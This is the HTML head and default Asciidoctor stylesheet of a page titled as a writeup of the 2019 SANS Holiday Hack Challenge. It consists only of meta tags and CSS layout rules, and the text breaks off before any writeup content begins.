<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 2.0.10">
<meta name="author" content="Istvan Toth &lt;an0n@tuta.io&gt;, an0nr0, @an0n_r0">
<title>The 2019 SANS Holiday Hack Challenge Writeup</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
<style>
/* Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
/* Uncomment @import statement to use as custom stylesheet */
/*@import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700";*/
article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}
audio,video{display:inline-block}
audio:not([controls]){display:none;height:0}
html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
a{background:none}
a:focus{outline:thin dotted}
a:active,a:hover{outline:0}
h1{font-size:2em;margin:.67em 0}
abbr[title]{border-bottom:1px dotted}
b,strong{font-weight:bold}
dfn{font-style:italic}
hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}
mark{background:#ff0;color:#000}
code,kbd,pre,samp{font-family:monospace;font-size:1em}
pre{white-space:pre-wrap}
q{quotes:"\201C" "\201D" "\2018" "\2019"}
small{font-size:80%}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
figure{margin:0}
fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
legend{border:0;padding:0}
button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
button,input{line-height:normal}
button,select{text-transform:none}
button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
textarea{overflow:auto;vertical-align:top}
table{border-collapse:collapse;border-spacing:0}
*,*::before,*::after{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}
html,body{font-size:100%}
body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;font-weight:400;font-style:normal;line-height:1;position:relative;cursor:auto;tab-size:4;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
a:hover{cursor:pointer}
img,object,embed{max-width:100%;height:auto}
object,embed{height:100%}
img{-ms-interpolation-mode:bicubic}
.left{float:left!important}
.right{float:right!important}
.text-left{text-align:left!important}
.text-right{text-align:right!important}
.text-center{text-align:center!important}
.text-justify{text-align:justify!important}
.hide{display:none}
img,object,svg{display:inline-block;vertical-align:middle}
textarea{height:auto;min-height:50px}
select{width:100%}
.center{margin-left:auto;margin-right:auto}
.stretch{width:100%}
.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0;direction:ltr}
a{color:#2156a5;text-decoration:underline;line-height:inherit}
a:hover,a:focus{color:#1d4b8f}
a img{border:0}
p{font-family:inherit;font-weight:400;font-size:1em;line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
p aside{font-size:.875em;line-height:1.35;font-style:italic}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
h1{font-size:2.125em}
h2{font-size:1.6875em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
h4,h5{font-size:1.125em}
h6{font-size:1em}
hr{border:solid #dddddf;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em;height:0}
em,i{font-style:italic;line-height:inherit}
strong,b{font-weight:bold;line-height:inherit}
small{font-size:60%;line-height:inherit}
code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
ul,ol,dl{font-size:1em;line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
ul,ol{margin-left:1.5em}
ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0;font-size:1em}
ul.square li ul,ul.circle li ul,ul.disc li ul{list-style:inherit}
ul.square{list-style-type:square}
ul.circle{list-style-type:circle}
ul.disc{list-style-type:disc}
ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
dl dt{margin-bottom:.3125em;font-weight:bold}
dl dd{margin-bottom:1.25em}
abbr,acronym{text-transform:uppercase;font-size:90%;color:rgba(0,0,0,.8);border-bottom:1px dotted #ddd;cursor:help}
abbr{text-transform:none}
blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
blockquote cite{display:block;font-size:.9375em;color:rgba(0,0,0,.6)}
blockquote cite::before{content:"\2014 \0020"}
blockquote cite a,blockquote cite a:visited{color:rgba(0,0,0,.6)}
blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
h1{font-size:2.75em}
h2{font-size:2.3125em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
h4{font-size:1.4375em}}
table{background:#fff;margin-bottom:1.25em;border:solid 1px #dedede}
table thead,table tfoot{background:#f7f8f7}
table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
table tr.even,table tr.alt{background:#f8f8f7}
table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{display:table-cell;line-height:1.6}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
.clearfix::after,.float-group::after{clear:both}
:not(pre):not([class^=L])>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background:#f7f7f8;-webkit-border-radius:4px;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed;word-wrap:break-word}
:not(pre)>code.nobreak{word-wrap:normal}
:not(pre)>code.nowrap{white-space:nowrap}
pre{color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;line-height:1.45;text-rendering:optimizeSpeed}
pre code,pre pre{color:inherit;font-size:inherit;line-height:inherit}
pre>code{display:block}
pre.nowrap,pre.nowrap pre{white-space:pre;word-wrap:normal}
em em{font-style:normal}
strong strong{font-weight:400}
.keyseq{color:rgba(51,51,51,.8)}
kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background:#f7f7f7;border:1px solid #ccc;-webkit-border-radius:3px;border-radius:3px;-webkit-box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em white inset;box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em #fff inset;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
.keyseq kbd:first-child{margin-left:0}
.keyseq kbd:last-child{margin-right:0}
.menuseq,.menuref{color:#000}
.menuseq b:not(.caret),.menuref{font-weight:inherit}
.menuseq{word-spacing:-.02em}
.menuseq b.caret{font-size:1.25em;line-height:.8}
.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
b.button::before{content:"[";padding:0 3px 0 2px}
b.button::after{content:"]";padding:0 2px 0 3px}
p a>code:hover{color:rgba(0,0,0,.9)}
#header,#content,#footnotes,#footer{width:100%;margin-left:auto;margin-right:auto;margin-top:0;margin-bottom:0;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
#content{margin-top:1.25em}
#content::before{content:none}
#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #dddddf}
#header>h1:only-child,body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #dddddf;padding-bottom:8px}
#header .details{border-bottom:1px solid #dddddf;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:-ms-flexbox;display:-webkit-flex;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap}
#header .details span:first-child{margin-left:-.125em}
#header .details span.email a{color:rgba(0,0,0,.85)}
#header .details br{display:none}
#header .details br+span::before{content:"\00a0\2013\00a0"}
#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
#header .details br+span#revremark::before{content:"\00a0|\00a0"}
#header #revnumber{text-transform:capitalize}
#header #revnumber::after{content:"\00a0"}
#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #dddddf;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
#toc{border-bottom:1px solid #e7e7e9;padding-bottom:.5em}
#toc>ul{margin-left:.125em}
#toc ul.sectlevel0>li>a{font-style:italic}
#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
#toc li{line-height:1.3334;margin-top:.3334em}
#toc a{text-decoration:none}
#toc a:active{text-decoration:underline}
#toctitle{color:#7a2518;font-size:1.2em}
@media screen and (min-width:768px){#toctitle{font-size:1.375em}
body.toc2{padding-left:15em;padding-right:0}
#toc.toc2{margin-top:0!important;background:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #e7e7e9;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
#toc.toc2>ul{font-size:.9em;margin-bottom:0}
#toc.toc2 ul ul{margin-left:0;padding-left:1em}
#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
body.toc2.toc-right{padding-left:0;padding-right:15em}
body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #e7e7e9;left:auto;right:0}}
@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
#toc.toc2{width:20em}
#toc.toc2 #toctitle{font-size:1.375em}
#toc.toc2>ul{font-size:.95em}
#toc.toc2 ul ul{padding-left:1.25em}
body.toc2.toc-right{padding-left:0;padding-right:20em}}
#content #toc{border-style:solid;border-width:1px;border-color:#e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;-webkit-border-radius:4px;border-radius:4px}
#content #toc>:first-child{margin-top:0}
#content #toc>:last-child{margin-bottom:0}
#footer{max-width:100%;background:rgba(0,0,0,.8);padding:1.25em}
#footer-text{color:rgba(255,255,255,.8);line-height:1.44}
#content{margin-bottom:.625em}
.sect1{padding-bottom:.625em}
@media screen and (min-width:768px){#content{margin-bottom:1.25em}
.sect1{padding-bottom:1.25em}}
.sect1:last-child{padding-bottom:0}
.sect1+.sect1{border-top:1px solid #e7e7e9}
#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
details,.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
details>summary:first-of-type{cursor:pointer;display:list-item;outline:none;margin-bottom:.75em}
.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
.paragraph.lead>p,#preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
table.tableblock #preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:inherit}
.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
.admonitionblock>table td.icon{text-align:center;width:80px}
.admonitionblock>table td.icon img{max-width:none}
.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #dddddf;color:rgba(0,0,0,.6)}
.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
.exampleblock>.content{border-style:solid;border-width:1px;border-color:#e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;-webkit-border-radius:4px;border-radius:4px}
.exampleblock>.content>:first-child{margin-top:0}
.exampleblock>.content>:last-child{margin-bottom:0}
.sidebarblock{border-style:solid;border-width:1px;border-color:#dbdbd6;margin-bottom:1.25em;padding:1.25em;background:#f3f3f2;-webkit-border-radius:4px;border-radius:4px}
.sidebarblock>:first-child{margin-top:0}
.sidebarblock>:last-child{margin-bottom:0}
.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
.literalblock pre,.listingblock>.content>pre{-webkit-border-radius:4px;border-radius:4px;word-wrap:break-word;overflow-x:auto;padding:1em;font-size:.8125em}
@media screen and (min-width:768px){.literalblock pre,.listingblock>.content>pre{font-size:.90625em}}
@media screen and (min-width:1280px){.literalblock pre,.listingblock>.content>pre{font-size:1em}}
.literalblock pre,.listingblock>.content>pre:not(.highlight),.listingblock>.content>pre[class="highlight"],.listingblock>.content>pre[class^="highlight "]{background:#f7f7f8}
.literalblock.output pre{color:#f7f7f8;background:rgba(0,0,0,.9)}
.listingblock>.content{position:relative}
.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:inherit;opacity:.5}
.listingblock:hover code[data-lang]::before{display:block}
.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:inherit;opacity:.5}
.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
.listingblock pre.highlightjs{padding:0}
.listingblock pre.highlightjs>code{padding:1em;-webkit-border-radius:4px;border-radius:4px}
.listingblock pre.prettyprint{border-width:0}
.prettyprint{background:#f7f7f8}
pre.prettyprint .linenums{line-height:1.45;margin-left:2em}
pre.prettyprint li{background:none;list-style-type:inherit;padding-left:0}
pre.prettyprint li code[data-lang]::before{opacity:1}
pre.prettyprint li:not(:first-child) code[data-lang]::before{display:none}
table.linenotable{border-collapse:separate;border:0;margin-bottom:0;background:none}
table.linenotable td[class]{color:inherit;vertical-align:top;padding:0;line-height:inherit;white-space:normal}
table.linenotable td.code{padding-left:.75em}
table.linenotable td.linenos{border-right:1px solid currentColor;opacity:.35;padding-right:.5em}
pre.pygments .lineno{border-right:1px solid currentColor;opacity:.35;display:inline-block;margin-right:.75em}
pre.pygments .lineno::before{content:"";margin-right:-.125em}
.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
.quoteblock:not(.excerpt)>.title{margin-left:-1.5em;margin-bottom:.75em}
.quoteblock blockquote,.quoteblock p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
.quoteblock blockquote{margin:0;padding:0;border:0}
.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
.quoteblock .attribution{margin-top:.75em;margin-right:.5ex;text-align:right}
.verseblock{margin:0 1em 1.25em}
.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
.verseblock pre strong{font-weight:400}
.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
.quoteblock .attribution br,.verseblock .attribution br{display:none}
.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
.quoteblock.abstract blockquote::before,.quoteblock.excerpt blockquote::before,.quoteblock .quoteblock blockquote::before{display:none}
.quoteblock.abstract blockquote,.quoteblock.abstract p,.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{line-height:1.6;word-spacing:0}
.quoteblock.abstract{margin:0 1em 1.25em;display:block}
.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
.quoteblock.excerpt>blockquote,.quoteblock .quoteblock{padding:0 0 .25em 1em;border-left:.25em solid #dddddf}
.quoteblock.excerpt,.quoteblock .quoteblock{margin-left:0}
.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{color:inherit;font-size:1.0625rem}
.quoteblock.excerpt .attribution,.quoteblock .quoteblock .attribution{color:inherit;text-align:left;margin-right:0}
table.tableblock{max-width:100%;border-collapse:separate}
p.tableblock:last-child{margin-bottom:0}
td.tableblock>.content>:last-child{margin-bottom:-1.25em}
td.tableblock>.content>:last-child.sidebarblock{margin-bottom:0}
table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
table.grid-all>thead>tr>.tableblock,table.grid-all>tbody>tr>.tableblock{border-width:0 1px 1px 0}
table.grid-all>tfoot>tr>.tableblock{border-width:1px 1px 0 0}
table.grid-cols>*>tr>.tableblock{border-width:0 1px 0 0}
table.grid-rows>thead>tr>.tableblock,table.grid-rows>tbody>tr>.tableblock{border-width:0 0 1px}
table.grid-rows>tfoot>tr>.tableblock{border-width:1px 0 0}
table.grid-all>*>tr>.tableblock:last-child,table.grid-cols>*>tr>.tableblock:last-child{border-right-width:0}
table.grid-all>tbody>tr:last-child>.tableblock,table.grid-all>thead:last-child>tr>.tableblock,table.grid-rows>tbody>tr:last-child>.tableblock,table.grid-rows>thead:last-child>tr>.tableblock{border-bottom-width:0}
table.frame-all{border-width:1px}
table.frame-sides{border-width:0 1px}
table.frame-topbot,table.frame-ends{border-width:1px 0}
table.stripes-all tr,table.stripes-odd tr:nth-of-type(odd),table.stripes-even tr:nth-of-type(even),table.stripes-hover tr:hover{background:#f8f8f7}
th.halign-left,td.halign-left{text-align:left}
th.halign-right,td.halign-right{text-align:right}
th.halign-center,td.halign-center{text-align:center}
th.valign-top,td.valign-top{vertical-align:top}
th.valign-bottom,td.valign-bottom{vertical-align:bottom}
th.valign-middle,td.valign-middle{vertical-align:middle}
table thead th,table tfoot th{font-weight:bold}
tbody tr th{display:table-cell;line-height:1.6;background:#f7f8f7}
tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
p.tableblock>code:only-child{background:none;padding:0}
p.tableblock{font-size:1em}
ol{margin-left:1.75em}
ul li ol{margin-left:1.5em}
dl dd{margin-left:1.125em}
dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
ol>li p,ul>li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
ul.unstyled,ol.unstyled{margin-left:0}
ul.checklist{margin-left:.625em}
ul.checklist li>p:first-child>.fa-square-o:first-child,ul.checklist li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
ul.checklist li>p:first-child>input[type="checkbox"]:first-child{margin-right:.25em}
ul.inline{display:-ms-flexbox;display:-webkit-box;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
ul.inline>li{margin-left:1.25em}
.unstyled dl dt{font-weight:400;font-style:normal}
ol.arabic{list-style-type:decimal}
ol.decimal{list-style-type:decimal-leading-zero}
ol.loweralpha{list-style-type:lower-alpha}
ol.upperalpha{list-style-type:upper-alpha}
ol.lowerroman{list-style-type:lower-roman}
ol.upperroman{list-style-type:upper-roman}
ol.lowergreek{list-style-type:lower-greek}
.hdlist>table,.colist>table{border:0;background:none}
.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
td.hdlist1{font-weight:bold;padding-bottom:1.25em}
.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
.colist td:not([class]):first-child img{max-width:none}
.colist td:not([class]):last-child{padding:.25em 0}
.thumb,.th{line-height:0;display:inline-block;border:solid 4px #fff;-webkit-box-shadow:0 0 0 1px #ddd;box-shadow:0 0 0 1px #ddd}
.imageblock.left{margin:.25em .625em 1.25em 0}
.imageblock.right{margin:.25em 0 1.25em .625em}
.imageblock>.title{margin-bottom:0}
.imageblock.thumb,.imageblock.th{border-width:6px}
.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
.image.left{margin-right:.625em}
.image.right{margin-left:.625em}
a.image{text-decoration:none;display:inline-block}
a.image object{pointer-events:none}
sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
sup.footnote a,sup.footnoteref a{text-decoration:none}
sup.footnote a:active,sup.footnoteref a:active{text-decoration:underline}
#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
#footnotes .footnote:last-of-type{margin-bottom:0}
#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
.gist .file-data>table{border:0;background:#fff;width:100%;margin-bottom:0}
.gist .file-data>table td.line-data{width:99%}
div.unbreakable{page-break-inside:avoid}
.big{font-size:larger}
.small{font-size:smaller}
.underline{text-decoration:underline}
.overline{text-decoration:overline}
.line-through{text-decoration:line-through}
.aqua{color:#00bfbf}
.aqua-background{background:#00fafa}
.black{color:#000}
.black-background{background:#000}
.blue{color:#0000bf}
.blue-background{background:#0000fa}
.fuchsia{color:#bf00bf}
.fuchsia-background{background:#fa00fa}
.gray{color:#606060}
.gray-background{background:#7d7d7d}
.green{color:#006000}
.green-background{background:#007d00}
.lime{color:#00bf00}
.lime-background{background:#00fa00}
.maroon{color:#600000}
.maroon-background{background:#7d0000}
.navy{color:#000060}
.navy-background{background:#00007d}
.olive{color:#606000}
.olive-background{background:#7d7d00}
.purple{color:#600060}
.purple-background{background:#7d007d}
.red{color:#bf0000}
.red-background{background:#fa0000}
.silver{color:#909090}
.silver-background{background:#bcbcbc}
.teal{color:#006060}
.teal-background{background:#007d7d}
.white{color:#bfbfbf}
.white-background{background:#fafafa}
.yellow{color:#bfbf00}
.yellow-background{background:#fafa00}
span.icon>.fa{cursor:default}
a span.icon>.fa{cursor:inherit}
.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
.conum[data-value]{display:inline-block;color:#fff!important;background:rgba(0,0,0,.8);-webkit-border-radius:100px;border-radius:100px;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
.conum[data-value] *{color:#fff!important}
.conum[data-value]+b{display:none}
.conum[data-value]::after{content:attr(data-value)}
pre .conum[data-value]{position:relative;top:-.125em}
b.conum *{color:inherit!important}
.conum:not([data-value]):empty{display:none}
dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
h1,h2,p,td.content,span.alt{letter-spacing:-.01em}
p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
p,blockquote,dt,td.content,span.alt{font-size:1.0625rem}
p{margin-bottom:1.25rem}
.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
.exampleblock>.content{background:#fffef7;border-color:#e0e0dc;-webkit-box-shadow:0 1px 4px #e0e0dc;box-shadow:0 1px 4px #e0e0dc}
.print-only{display:none!important}
@page{margin:1.25cm .75cm}
@media print{*{-webkit-box-shadow:none!important;box-shadow:none!important;text-shadow:none!important}
html{font-size:80%}
a{color:inherit!important;text-decoration:underline!important}
a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
abbr[title]::after{content:" (" attr(title) ")"}
pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
thead{display:table-header-group}
svg{max-width:100%}
p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
#toc,.sidebarblock,.exampleblock>.content{background:none!important}
#toc{border-bottom:1px solid #dddddf!important;padding-bottom:0!important}
body.book #header{text-align:center}
body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
body.book #header .details{border:0!important;display:block;padding:0!important}
body.book #header .details span:first-child{margin-left:0!important}
body.book #header .details br{display:block}
body.book #header .details br+span::before{content:none!important}
body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
.listingblock code[data-lang]::before{display:block}
#footer{padding:0 .9375em}
.hide-on-print{display:none!important}
.print-only{display:block!important}
.hide-for-print{display:none!important}
.show-for-print{display:inherit!important}}
